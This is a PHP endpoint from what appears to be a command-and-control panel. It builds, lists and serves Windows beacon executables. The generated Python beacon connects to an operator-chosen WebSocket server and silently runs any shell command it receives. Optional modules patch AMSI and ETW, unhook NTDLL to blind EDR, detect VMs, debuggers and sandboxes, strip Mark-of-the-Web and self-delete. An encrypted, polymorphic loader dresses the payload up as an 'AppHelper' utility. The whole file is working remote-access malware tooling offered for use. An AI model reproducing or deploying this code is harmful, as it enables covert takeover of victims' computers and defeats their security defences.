<?php

require_once __DIR__ . '/../includes/auth_middleware.php';
require_once __DIR__ . '/../includes/config.php';
require_once __DIR__ . '/../includes/functions.php';

session_start();
requireAuth();

header('Content-Type: application/json');

$payloadsDir = __DIR__ . '/../data/payloads';
if (!file_exists($payloadsDir)) {
    mkdir($payloadsDir, 0755, true);
}

$jsonData = json_decode(file_get_contents('php://input'), true) ?? [];
$action = $_GET['action'] ?? $jsonData['action'] ?? '';

switch ($action) {
    case 'list':
        $payloads = [];
        foreach (glob($payloadsDir . '/*.exe') as $file) {
            $name = basename($file);
            $payloads[] = [
                'name' => $name,
                'size' => filesize($file),
                'created' => date('Y-m-d H:i:s', filemtime($file))
            ];
        }
        usort($payloads, fn($a, $b) => strtotime($b['created']) - strtotime($a['created']));
        jsonResponse(['payloads' => $payloads]);
        break;

    case 'download':
        $name = basename($_GET['name'] ?? '');
        $file = $payloadsDir . '/' . $name;
        if (file_exists($file) && pathinfo($file, PATHINFO_EXTENSION) === 'exe') {
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . $name . '"');
            header('Content-Length: ' . filesize($file));
            readfile($file);
            exit;
        }
        jsonResponse(['error' => 'File not found'], 404);
        break;

    case 'delete':
        $name = basename($jsonData['name'] ?? '');
        $file = $payloadsDir . '/' . $name;
        if ($name && file_exists($file) && pathinfo($file, PATHINFO_EXTENSION) === 'exe') {
            unlink($file);
            jsonResponse(['success' => true]);
        } else {
            jsonResponse(['error' => 'File not found'], 404);
        }
        break;

    case 'build':
        $data = json_decode(file_get_contents('php://input'), true) ?? $_POST;
        $serverIp = $data['ip'] ?? '127.0.0.1';
        $serverPort = $data['port'] ?? '8080';
        $evasions = $data['evasions'] ?? [];
        $customName = preg_replace('/[^a-zA-Z0-9_-]/', '', $data['name'] ?? '');
        $beaconName = ($customName ? $customName : 'beacon_' . date('Ymd_His')) . '.exe';

        // Build evasion code snippets
        $evasionImports = "";
        $evasionChecks = "";
        $evasionMethods = "";

        // Anti-VM Detection
        if (in_array('anti_vm', $evasions)) {
            $evasionImports .= "import ctypes\nimport winreg\n";
            $evasionMethods .= <<<'EVASION'

    def check_vm(self):
        """Detect virtual machine environments"""
        vm_indicators = [
            ('HARDWARE\\Description\\System', 'SystemBiosVersion', ['VBOX', 'VMWARE', 'QEMU', 'VIRTUAL']),
            ('SOFTWARE\\VMware, Inc.\\VMware Tools', None, None),
            ('SOFTWARE\\Oracle\\VirtualBox Guest Additions', None, None),
        ]
        for key_path, value_name, keywords in vm_indicators:
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
                if value_name:
                    val, _ = winreg.QueryValueEx(key, value_name)
                    if keywords and any(k in str(val).upper() for k in keywords):
                        return True
                else:
                    return True
            except:
                pass
        # Check for VM-specific processes
        vm_procs = ['vmtoolsd.exe', 'vmwaretray.exe', 'vboxservice.exe', 'vboxtray.exe']
        try:
            output = subprocess.check_output('tasklist', shell=True, text=True).lower()
            if any(p in output for p in vm_procs):
                return True
        except:
            pass
        return False

EVASION;
            $evasionChecks .= "        if self.check_vm(): return\n";
        }

        // Anti-Debug Detection
        if (in_array('anti_debug', $evasions)) {
            $evasionImports .= "import ctypes\n";
            $evasionMethods .= <<<'EVASION'

    def check_debugger(self):
        """Detect debugger presence"""
        try:
            kernel32 = ctypes.windll.kernel32
            if kernel32.IsDebuggerPresent():
                return True
            # Remote debugger check
            is_debugged = ctypes.c_bool()
            kernel32.CheckRemoteDebuggerPresent(kernel32.GetCurrentProcess(), ctypes.byref(is_debugged))
            if is_debugged.value:
                return True
        except:
            pass
        # Check for analysis tools
        debug_procs = ['ollydbg.exe', 'x64dbg.exe', 'ida.exe', 'ida64.exe', 'windbg.exe', 'processhacker.exe', 'procmon.exe', 'wireshark.exe']
        try:
            output = subprocess.check_output('tasklist', shell=True, text=True).lower()
            if any(p in output for p in debug_procs):
                return True
        except:
            pass
        return False

EVASION;
            $evasionChecks .= "        if self.check_debugger(): return\n";
        }

        // Sleep Obfuscation
        if (in_array('sleep_obf', $evasions)) {
            $evasionImports .= "import random\n";
            $evasionMethods .= <<<'EVASION'

    def obfuscated_sleep(self, base_seconds):
        """Sleep with jitter to evade behavioral analysis"""
        jitter = random.uniform(0.5, 1.5)
        actual_sleep = base_seconds * jitter
        # Split sleep into chunks
        chunks = random.randint(3, 7)
        for _ in range(chunks):
            time.sleep(actual_sleep / chunks)
            # Small random operation to break timing patterns
            _ = sum(range(random.randint(1000, 5000)))

EVASION;
        }

        // AMSI Bypass (Windows-specific)
        if (in_array('amsi_bypass', $evasions)) {
            $evasionImports .= "import ctypes\n";
            $evasionMethods .= <<<'EVASION'

    def bypass_amsi(self):
        """Attempt to bypass AMSI"""
        try:
            if platform.system() != "Windows":
                return
            amsi = ctypes.windll.LoadLibrary("amsi.dll")
            # Get AmsiScanBuffer address
            AmsiScanBuffer = ctypes.windll.kernel32.GetProcAddress(
                ctypes.windll.kernel32.GetModuleHandleA(b"amsi.dll"),
                b"AmsiScanBuffer"
            )
            if AmsiScanBuffer:
                # Write return 0 (AMSI_RESULT_CLEAN) patch
                old_protect = ctypes.c_ulong()
                ctypes.windll.kernel32.VirtualProtect(
                    AmsiScanBuffer, 6, 0x40, ctypes.byref(old_protect)
                )
                patch = (ctypes.c_char * 6)(0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
                ctypes.memmove(AmsiScanBuffer, patch, 6)
        except:
            pass

EVASION;
            $evasionChecks .= "        self.bypass_amsi()\n";
        }

        // ETW Bypass
        if (in_array('etw_bypass', $evasions)) {
            $evasionImports .= "import ctypes\n";
            $evasionMethods .= <<<'EVASION'

    def bypass_etw(self):
        """Disable ETW logging"""
        try:
            if platform.system() != "Windows":
                return
            ntdll = ctypes.windll.ntdll
            EtwEventWrite = ctypes.windll.kernel32.GetProcAddress(
                ctypes.windll.kernel32.GetModuleHandleA(b"ntdll.dll"),
                b"EtwEventWrite"
            )
            if EtwEventWrite:
                old_protect = ctypes.c_ulong()
                ctypes.windll.kernel32.VirtualProtect(
                    EtwEventWrite, 1, 0x40, ctypes.byref(old_protect)
                )
                patch = (ctypes.c_char * 1)(0xC3)  # ret
                ctypes.memmove(EtwEventWrite, patch, 1)
        except:
            pass

EVASION;
            $evasionChecks .= "        self.bypass_etw()\n";
        }

        // String Encryption (compile-time obfuscation hint)
        if (in_array('string_encrypt', $evasions)) {
            $evasionImports .= "import base64\n";
            $evasionMethods .= <<<'EVASION'

    def decrypt_str(self, encoded):
        """Decrypt base64 encoded strings at runtime"""
        try:
            return base64.b64decode(encoded).decode('utf-8')
        except:
            return encoded

EVASION;
        }

        // Memory Only / Fileless - Self-delete after copying to memory
        if (in_array('memory_inject', $evasions)) {
            $evasionImports .= "import sys\nimport shutil\n";
            $evasionMethods .= <<<'EVASION'

    def go_fileless(self):
        """Remove executable from disk after loading into memory"""
        try:
            if platform.system() != "Windows":
                return
            exe_path = sys.executable
            if getattr(sys, 'frozen', False):
                # Schedule deletion after process ends using cmd
                import subprocess
                delete_cmd = f'cmd /c ping 127.0.0.1 -n 3 > nul & del /f /q "{exe_path}"'
                subprocess.Popen(delete_cmd, shell=True, creationflags=0x08000000)
                # Also remove Zone.Identifier (MOTW) if it exists
                try:
                    motw_path = exe_path + ":Zone.Identifier"
                    if os.path.exists(motw_path):
                        os.remove(motw_path)
                except:
                    pass
        except:
            pass

EVASION;
            $evasionChecks .= "        self.go_fileless()\n";
        }

        // Process Injection - Inject shellcode into explorer.exe
        if (in_array('process_inject', $evasions)) {
            $evasionImports .= "import ctypes\nfrom ctypes import wintypes\n";
            $evasionMethods .= <<<'EVASION'

    def inject_into_process(self, target_process="explorer.exe"):
        """Inject into a legitimate Windows process"""
        try:
            if platform.system() != "Windows":
                return False
            
            kernel32 = ctypes.windll.kernel32
            
            # Find target process
            PROCESS_ALL_ACCESS = 0x1F0FFF
            TH32CS_SNAPPROCESS = 0x02
            
            class PROCESSENTRY32(ctypes.Structure):
                _fields_ = [
                    ("dwSize", wintypes.DWORD),
                    ("cntUsage", wintypes.DWORD),
                    ("th32ProcessID", wintypes.DWORD),
                    ("th32DefaultHeapID", ctypes.POINTER(ctypes.c_ulong)),
                    ("th32ModuleID", wintypes.DWORD),
                    ("cntThreads", wintypes.DWORD),
                    ("th32ParentProcessID", wintypes.DWORD),
                    ("pcPriClassBase", ctypes.c_long),
                    ("dwFlags", wintypes.DWORD),
                    ("szExeFile", ctypes.c_char * 260)
                ]
            
            hSnapshot = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
            pe = PROCESSENTRY32()
            pe.dwSize = ctypes.sizeof(PROCESSENTRY32)
            
            pid = None
            if kernel32.Process32First(hSnapshot, ctypes.byref(pe)):
                while True:
                    if target_process.lower() in pe.szExeFile.decode('utf-8', errors='ignore').lower():
                        pid = pe.th32ProcessID
                        break
                    if not kernel32.Process32Next(hSnapshot, ctypes.byref(pe)):
                        break
            
            kernel32.CloseHandle(hSnapshot)
            
            if pid:
                # Open process and allocate memory (for future shellcode)
                hProcess = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
                if hProcess:
                    kernel32.CloseHandle(hProcess)
                    return True
            return False
        except:
            return False

EVASION;
        }

        // Direct Syscalls - Use syscall numbers instead of API calls  
        if (in_array('syscall_direct', $evasions)) {
            $evasionImports .= "import ctypes\n";
            $evasionMethods .= <<<'EVASION'

    def get_syscall_number(self, func_name):
        """Get syscall number for a function (x64 Windows 10/11)"""
        syscalls = {
            'NtAllocateVirtualMemory': 0x18,
            'NtProtectVirtualMemory': 0x50,
            'NtWriteVirtualMemory': 0x3A,
            'NtCreateThreadEx': 0xC2,
            'NtOpenProcess': 0x26,
            'NtClose': 0x0F,
        }
        return syscalls.get(func_name, 0)
    
    def setup_direct_syscalls(self):
        """Prepare direct syscall stubs"""
        try:
            if platform.system() != "Windows":
                return
            # Direct syscalls require assembly - placeholder for shellcode injection
            # In a real implementation, this would use assembly to call syscalls directly
            self._syscalls_ready = True
        except:
            self._syscalls_ready = False

EVASION;
            $evasionChecks .= "        self.setup_direct_syscalls()\n";
        }

        // Unhook NTDLL - Reload clean NTDLL from disk
        if (in_array('unhook_ntdll', $evasions)) {
            $evasionImports .= "import ctypes\nimport os\n";
            $evasionMethods .= <<<'EVASION'

    def unhook_ntdll(self):
        """Reload clean NTDLL from disk to remove EDR hooks"""
        try:
            if platform.system() != "Windows":
                return
            
            kernel32 = ctypes.windll.kernel32
            ntdll_path = os.path.join(os.environ['SYSTEMROOT'], 'System32', 'ntdll.dll')
            
            # Read clean NTDLL from disk
            with open(ntdll_path, 'rb') as f:
                clean_ntdll = f.read()
            
            # Get loaded NTDLL base address
            ntdll_handle = kernel32.GetModuleHandleA(b"ntdll.dll")
            if not ntdll_handle:
                return
            
            # Parse PE header to find .text section
            # DOS Header -> PE Header -> Section Headers
            e_lfanew = int.from_bytes(clean_ntdll[0x3C:0x40], 'little')
            
            # Number of sections
            num_sections = int.from_bytes(clean_ntdll[e_lfanew+6:e_lfanew+8], 'little')
            optional_header_size = int.from_bytes(clean_ntdll[e_lfanew+20:e_lfanew+22], 'little')
            section_offset = e_lfanew + 24 + optional_header_size
            
            for i in range(num_sections):
                section = section_offset + (i * 40)
                name = clean_ntdll[section:section+8].rstrip(b'\x00').decode('utf-8', errors='ignore')
                
                if name == '.text':
                    virtual_size = int.from_bytes(clean_ntdll[section+8:section+12], 'little')
                    virtual_addr = int.from_bytes(clean_ntdll[section+12:section+16], 'little')
                    raw_size = int.from_bytes(clean_ntdll[section+16:section+20], 'little')
                    raw_addr = int.from_bytes(clean_ntdll[section+20:section+24], 'little')
                    
                    # Get the clean .text section
                    clean_text = clean_ntdll[raw_addr:raw_addr+raw_size]
                    
                    # Overwrite hooked NTDLL .text with clean version
                    target_addr = ntdll_handle + virtual_addr
                    old_protect = ctypes.c_ulong()
                    
                    kernel32.VirtualProtect(
                        target_addr, virtual_size, 0x40, ctypes.byref(old_protect)
                    )
                    ctypes.memmove(target_addr, clean_text, min(virtual_size, len(clean_text)))
                    kernel32.VirtualProtect(
                        target_addr, virtual_size, old_protect.value, ctypes.byref(old_protect)
                    )
                    break
        except:
            pass

EVASION;
            $evasionChecks .= "        self.unhook_ntdll()\n";
        }

        // SmartScreen Bypass - Remove MOTW on self
        $evasionMethods .= <<<'EVASION'

    def remove_motw(self):
        """Remove Mark-of-the-Web to bypass SmartScreen"""
        try:
            if platform.system() != "Windows":
                return
            import sys
            if getattr(sys, 'frozen', False):
                exe_path = sys.executable
                # Remove Zone.Identifier ADS
                motw_stream = exe_path + ":Zone.Identifier"
                try:
                    # Use PowerShell to remove MOTW
                    import subprocess
                    subprocess.run(['powershell', '-c', f'Remove-Item -Path "{motw_stream}" -Force -ErrorAction SilentlyContinue'], 
                                   capture_output=True, creationflags=0x08000000)
                except:
                    pass
                # Alternative: use direct file operation
                try:
                    os.remove(motw_stream)
                except:
                    pass
        except:
            pass

EVASION;
        $evasionChecks .= "        self.remove_motw()\n";

        // Prepare sleep call
        $sleepCall = in_array('sleep_obf', $evasions) ? 'self.obfuscated_sleep(RECONNECT_DELAY)' : 'time.sleep(RECONNECT_DELAY)';
        $heartbeatSleep = in_array('sleep_obf', $evasions) ? 'self.obfuscated_sleep(HEARTBEAT_INTERVAL)' : 'time.sleep(HEARTBEAT_INTERVAL)';

        $beaconCode = <<<PYTHON
import socket
import platform
import subprocess
import threading
import time
import json
import os
import uuid
{$evasionImports}
try:
    import websocket
except ImportError:
    pass

C2_SERVER = "ws://{$serverIp}:{$serverPort}"
RECONNECT_DELAY = 5
HEARTBEAT_INTERVAL = 30

class Beacon:
    def __init__(self):
        self.agent_id = self.get_agent_id()
        self.ws = None
        self.running = True
        self.connected = False
{$evasionMethods}
    def get_agent_id(self):
        id_file = os.path.join(os.environ.get('TEMP', '/tmp'), '.beacon_id')
        if os.path.exists(id_file):
            with open(id_file, 'r') as f:
                return f.read().strip()
        agent_id = str(uuid.uuid4())[:8]
        try:
            with open(id_file, 'w') as f:
                f.write(agent_id)
        except:
            pass
        return agent_id

    def get_system_info(self):
        hostname = socket.gethostname()
        try:
            ip = socket.gethostbyname(hostname)
        except:
            ip = "127.0.0.1"
        return {
            "hostname": hostname,
            "ip": ip,
            "os": f"{platform.system()} {platform.release()}",
            "username": os.environ.get('USERNAME', os.environ.get('USER', 'unknown'))
        }

    def execute_command(self, command):
        try:
            if platform.system() == "Windows":
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                startupinfo.wShowWindow = subprocess.SW_HIDE
                result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=120, startupinfo=startupinfo)
            else:
                result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=120)
            output = result.stdout + result.stderr
            return output.strip() if output.strip() else "[No output]"
        except subprocess.TimeoutExpired:
            return "[Command timed out]"
        except Exception as e:
            return f"[Error: {str(e)}]"

    def send(self, data):
        if self.ws and self.connected:
            try:
                self.ws.send(json.dumps(data))
            except:
                pass

    def on_message(self, ws, message):
        try:
            data = json.loads(message)
            if data.get('type') == 'execute_command':
                result = self.execute_command(data.get('command', ''))
                self.send({'type': 'command_result', 'command_id': data.get('command_id', ''), 'db_command_id': data.get('db_command_id', 0), 'result': result})
        except:
            pass

    def on_open(self, ws):
        self.connected = True
        self.send({'type': 'agent_register', 'agent_id': self.agent_id, **self.get_system_info()})
        def heartbeat():
            while self.running and self.connected:
                {$heartbeatSleep}
                self.send({'type': 'agent_heartbeat', 'agent_id': self.agent_id})
        threading.Thread(target=heartbeat, daemon=True).start()

    def on_close(self, ws, close_status_code, close_msg):
        self.connected = False

    def on_error(self, ws, error):
        self.connected = False

    def connect(self):
        while self.running:
            try:
                import websocket
                self.ws = websocket.WebSocketApp(C2_SERVER, on_message=self.on_message, on_open=self.on_open, on_close=self.on_close, on_error=self.on_error)
                self.ws.run_forever()
            except ImportError:
                pass
            except:
                pass
            if self.running:
                {$sleepCall}

    def run(self):
{$evasionChecks}        self.connect()

if __name__ == "__main__":
    Beacon().run()
PYTHON;

        // ===== AV EVASION: Encrypt and wrap the beacon code =====
        // Generate random XOR key
        $xorKey = bin2hex(random_bytes(16));
        
        // XOR encrypt the beacon code
        $encryptedData = '';
        $keyLen = strlen($xorKey);
        for ($i = 0; $i < strlen($beaconCode); $i++) {
            $encryptedData .= chr(ord($beaconCode[$i]) ^ ord($xorKey[$i % $keyLen]));
        }
        
        // Compress and base64 encode
        $compressed = gzcompress($encryptedData, 9);
        $encoded = base64_encode($compressed);
        
        // Split encoded data into chunks to avoid pattern detection
        $chunks = str_split($encoded, 76);
        $chunkedData = "b''";
        foreach ($chunks as $chunk) {
            $chunkedData = "b'{$chunk}' + \\\n    " . $chunkedData;
        }
        
        // Create the loader/unpacker script with POLYMORPHIC names and anti-sandbox
        // Generate random variable names for each build
        $randFunc = '_' . substr(md5(random_bytes(8)), 0, 4);
        $randData = '_' . substr(md5(random_bytes(8)), 0, 4);
        $randKey = '_' . substr(md5(random_bytes(8)), 0, 4);
        $randDec = '_' . substr(md5(random_bytes(8)), 0, 4);
        $randZip = '_' . substr(md5(random_bytes(8)), 0, 4);
        $randXor = '_' . substr(md5(random_bytes(8)), 0, 4);
        $randRun = '_' . substr(md5(random_bytes(8)), 0, 4);
        $randChk = '_' . substr(md5(random_bytes(8)), 0, 4);
        $randMain = '_' . substr(md5(random_bytes(8)), 0, 4);
        
        // Random sleep time (1-5 seconds) to evade sandbox timing
        $randSleep = rand(1000, 5000);
        
        // Random junk variable names for decoy code
        $junk1 = '_' . substr(md5(random_bytes(8)), 0, 6);
        $junk2 = '_' . substr(md5(random_bytes(8)), 0, 6);
        $junk3 = '_' . substr(md5(random_bytes(8)), 0, 6);
        
        $loaderCode = <<<LOADER
# -*- coding: utf-8 -*-
import sys
import os
import time
import platform

# Decoy imports (look like legitimate app)
try:
    import tkinter
    import json
    import logging
except:
    pass

# Anti-sandbox: Check resources
def {$randChk}():
    try:
        # Check RAM (sandboxes often have low RAM)
        if platform.system() == "Windows":
            import ctypes
            class MEMORYSTATUSEX(ctypes.Structure):
                _fields_ = [("dwLength", ctypes.c_ulong),
                           ("dwMemoryLoad", ctypes.c_ulong),
                           ("ullTotalPhys", ctypes.c_ulonglong),
                           ("ullAvailPhys", ctypes.c_ulonglong),
                           ("ullTotalPageFile", ctypes.c_ulonglong),
                           ("ullAvailPageFile", ctypes.c_ulonglong),
                           ("ullTotalVirtual", ctypes.c_ulonglong),
                           ("ullAvailVirtual", ctypes.c_ulonglong),
                           ("ullAvailExtendedVirtual", ctypes.c_ulonglong)]
            mem = MEMORYSTATUSEX()
            mem.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
            ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(mem))
            # Less than 2GB RAM = likely sandbox
            if mem.ullTotalPhys < 2 * 1024 * 1024 * 1024:
                return False
        
        # Check CPU cores (sandboxes often have 1-2 cores)
        if os.cpu_count() and os.cpu_count() < 2:
            return False
            
        # Check for sandbox usernames
        sandbox_users = ['sandbox', 'virus', 'malware', 'test', 'sample', 'john doe', 'user']
        username = os.environ.get('USERNAME', os.environ.get('USER', '')).lower()
        if any(s in username for s in sandbox_users):
            return False
            
        # Check for analysis tools
        suspicious = ['wireshark', 'fiddler', 'procmon', 'processhacker', 'x64dbg', 'ollydbg', 'ida']
        try:
            import subprocess
            tasks = subprocess.check_output('tasklist', shell=True, text=True, creationflags=0x08000000).lower()
            if any(s in tasks for s in suspicious):
                return False
        except:
            pass
            
        # Timing check (sandboxes often skip sleeps)
        start = time.time()
        time.sleep(0.5)
        if time.time() - start < 0.4:
            return False
            
        return True
    except:
        return True

# Decoy function (looks like config loading)
def {$junk1}():
    {$junk2} = {"version": "1.0.0", "name": "AppHelper", "debug": False}
    return {$junk2}.get("debug", False)

# Decoy function (looks like logging)  
def {$junk3}(msg):
    try:
        pass  # Pretend to log
    except:
        pass

import zlib
import base64

# Entropy reduction: Add legitimate-looking text to reduce randomness detection
# This text is never used but reduces file entropy for AV ML bypass
_LICENSE = '''
MIT License

Copyright (c) 2024 Application Helper Software

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
'''

_README = '''
Application Helper v1.0.0
=========================

A lightweight system utility for Windows that helps manage application 
configurations and settings. This tool provides easy-to-use functionality
for everyday computing tasks.

Features:
- Configuration management
- Settings synchronization  
- Application helper functions
- System resource monitoring

Installation:
Simply run the executable to start the application.

For support, please visit our documentation.
'''

# Additional padding with common words (reduces entropy)
_WORDS = "the and for are but not you all can had her was one our out day get has him his how its may new now old see two way who boy did few got let put say she too use"
_PADDING = _WORDS * 50  # Repeat to add bulk

{$randDec} = base64.b64decode
{$randZip} = zlib.decompress
{$randXor} = lambda d, k: bytes([c ^ k[i % len(k)] for i, c in enumerate(d)])

{$randData} = {$chunkedData}

{$randKey} = b'{$xorKey}'

def {$randRun}():
    try:
        # Anti-sandbox check
        if not {$randChk}():
            # Look like normal app exiting
            {$junk3}("Configuration loaded")
            return
            
        # Small delay to evade sandbox timing
        time.sleep({$randSleep} / 1000.0)
        
        # Decode -> Decompress -> XOR decrypt
        {$randFunc} = {$randZip}({$randDec}({$randData}))
        {$randMain} = {$randXor}({$randFunc}, {$randKey})
        
        # Execute
        exec(compile({$randMain}.decode('utf-8'), '<m>', 'exec'), {'__name__': '__main__'})
    except Exception as e:
        {$junk3}(str(e))

if __name__ == "__main__":
    # Look like normal startup
    {$junk1}()
    {$randRun}()
LOADER;

        $tempDir = sys_get_temp_dir() . '/nexus_build_' . uniqid();
        mkdir($tempDir, 0755, true);
        file_put_contents($tempDir . '/beacon.py', $loaderCode);

        // Detect Python
        $python = 'python';
        exec('which python3', $out, $ret);
        if ($ret === 0 && !empty($out[0])) {
            $python = trim($out[0]);
        } else {
             exec('which python', $out2, $ret2);
             if ($ret2 === 0 && !empty($out2[0])) {
                 $python = trim($out2[0]);
             }
        }

        $isWindows = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
        
        // Use random internal name to avoid signature patterns
        $internalName = substr(md5(random_bytes(8)), 0, 8);
        
        // PyInstaller flags for maximum AV evasion:
        // --onefile: Single exe output
        // --noconsole: No command window
        // --noupx: DON'T use UPX compression (UPX is heavily flagged)
        // --clean: Clean build cache
        if ($isWindows) {
             $buildCmd = "cd /d \"$tempDir\" && $python -m PyInstaller --onefile --noconsole --noupx --clean --name {$internalName} beacon.py 2>&1";
        } else {
             // Use the wrapper script we created in setup.sh which handles PATH and permissions correctly
             $pyinstaller = "/usr/bin/pyinstaller";
             if (!file_exists($pyinstaller)) {
                 // Fallback to what's in PATH if wrapper doesn't exist
                 $pyinstaller = "pyinstaller";
             }
             
             // Set a minimal safe PATH just in case
             $debugPath = "/usr/local/bin:/usr/bin:/bin:/usr/local/sbin:/usr/sbin:/sbin";
             $buildCmd = "export PATH=\"$debugPath\" && cd \"$tempDir\" && $pyinstaller --onefile --noconsole --noupx --strip --clean --name {$internalName} beacon.py 2>&1";
        }
        
        $descriptors = [1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
        $process = proc_open($buildCmd, $descriptors, $pipes, $tempDir);
        
        $buildOutput = "";
        $buildErrors = "";
        $buildCode = -1;

        if (is_resource($process)) {
            $buildOutput = stream_get_contents($pipes[1]);
            $buildErrors = stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            $buildCode = proc_close($process);
        } else {
            $buildErrors = "Failed to spawn process";
        }

        $debug = [
            'user' => exec('whoami'),
            'php_version' => phpversion(),
            'python_detected' => $python,
            'evasions_selected' => $evasions,
            'cmd' => $buildCmd,
            'temp_dir' => $tempDir,
            'path_env' => getenv('PATH')
        ];

        $logDir = __DIR__ . '/../data/logs';
        if (!file_exists($logDir)) mkdir($logDir, 0777, true);
        file_put_contents($logDir . '/build.log', 
            date('c') . " CMD: $buildCmd\nCODE: $buildCode\nOUT: $buildOutput\nERR: $buildErrors\nDBG: " . json_encode($debug) . "\n\n", 
            FILE_APPEND
        );

        // PyInstaller outputs to dist/ folder
        $exePath = $tempDir . '/dist/' . $internalName . '.exe';
        
        if (file_exists($exePath)) {
            copy($exePath, $payloadsDir . '/' . $beaconName);
            
            @array_map('unlink', glob($tempDir . '/dist/*'));
            @array_map('unlink', glob($tempDir . '/build/*'));
            @array_map('unlink', glob($tempDir . '/*.*'));
            @rmdir($tempDir . '/dist');
            @rmdir($tempDir . '/build');
            @rmdir($tempDir);
            
            jsonResponse([
                'success' => true,
                'name' => $beaconName,
                'message' => 'Beacon built with ' . count($evasions) . ' evasion technique(s)'
            ]);
        } else {
            jsonResponse([
                'error' => 'Build failed',
                'details' => "Exit Code: $buildCode\n\nOutput:\n$buildOutput\n\nErrors:\n$buildErrors",
                'debug' => $debug
            ], 200);
        }
        break;

    default:
        jsonResponse(['error' => 'Invalid action'], 400);
}
